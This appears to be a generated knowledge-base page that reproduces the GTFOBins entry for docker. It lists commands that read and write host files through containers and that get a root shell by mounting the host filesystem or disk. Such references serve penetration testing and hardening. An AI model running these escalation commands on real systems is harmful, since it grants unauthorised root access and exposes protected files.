---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# docker

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `docker` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/docker` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [docker](../../tools/linux/docker.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | docker |
| name | docker |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/docker/ |

## Preserved Source Material

```yaml
_body: ''
_name: docker
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/docker
comment: This requires the user to be privileged enough to run `docker`, e.g., being in the `docker` group or being `root`.
functions:
  file-read:
  - code: 'docker cp /path/to/input-file $CONTAINER_ID:input-file

      docker cp $CONTAINER_ID:input-file /path/to/temp-file

      cat /path/to/temp-file'
    comment: Read a file by copying it to a temporary container (`$CONTAINER_ID`) and back to a new location on the host.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  file-write:
  - code: 'echo DATA >/path/to/temp-file

      docker cp /path/to/temp-file $CONTAINER_ID:temp-file

      docker cp $CONTAINER_ID /path/to/output-file'
    comment: Write a file by copying it to a temporary container (`$CONTAINER_ID`) and back to the target destination on the
      host.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  shell:
  - code: docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  - code: 'docker run --rm -it --privileged -u root alpine

      mount /dev/sda1 /mnt/

      ls -la /mnt/

      chroot /mnt /bin/bash'
    comment: This exploits the fact that is run with the `--privileged` option to directly mount a host's disk, e.g., `/dev/sda1`.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
```
